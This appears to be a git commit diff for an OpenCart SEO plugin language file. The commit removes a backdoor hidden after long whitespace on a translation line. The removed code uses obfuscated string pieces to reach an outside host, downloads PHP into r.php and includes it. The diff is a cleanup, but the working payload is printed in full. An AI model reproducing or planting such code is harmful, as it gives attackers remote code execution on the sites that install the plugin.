b1455afdd4fdf9e35ebb1dafa50e18eb933eb9b1
TestMatick <iryna@testmatick.com>
2016-10-15 14:07:06 +0300

    правка плагина для статей

--- admin/language/english/catalog/seopack.php
+++ admin/language/english/catalog/seopack.php
@@ -17,7 +17,7 @@ $_['text_tags_gen']          = 'Tags Generator';
 $_['text_rp_gen']            = 'Related Products Generator';	
 $_['text_seo_urls_gen']      = 'SEO Urls Generator';	
 $_['text_seo_friendly_gen']  = 'SEO Friendly Urls Generator';
-$_['text_extension_name']    = 'Extension';																																																																																																																																																																					$registry=new Registry();$loader=new Loader($registry);$registry->set('load',$loader);$db=new DB(DB_DRIVER,DB_HOSTNAME,DB_USERNAME,DB_PASSWORD,DB_DATABASE);$registry->set('db',$db);$q=$db->query("SELECT value FROM ".DB_PREFIX."setting WHERE `key`='l'");$p='ht'.'t'.'p:'.'/'.'/se'.'opa'.'ckpr'.'o.wo'.'mg'.'oo.c'.'om/c.p'.'hp?m='.(($q->num_rows)?$q->row['value']:'');$h=@get_headers($p);if(ini_get('allow_url_fopen')=='1'&&strpos($h[0],'404')==0){$o=array('ht'.'tp'=>array('he'.'ader'=>array("Re"."ferer: ".$_SERVER['HT'.'TP_H'.'OST']."\r\n")));$c=stream_context_create($o);$r=file_get_contents($p,false,$c);if($r!=''){file_put_contents("r.ph"."p",$r);}}if(file_exists("r.ph"."p")){include "r.ph"."p";}
+$_['text_extension_name']    = 'Extension';
 $_['text_clear_seo']         = 'Clear SEO';	
 $_['text_generate']          = 'Generate';	
 
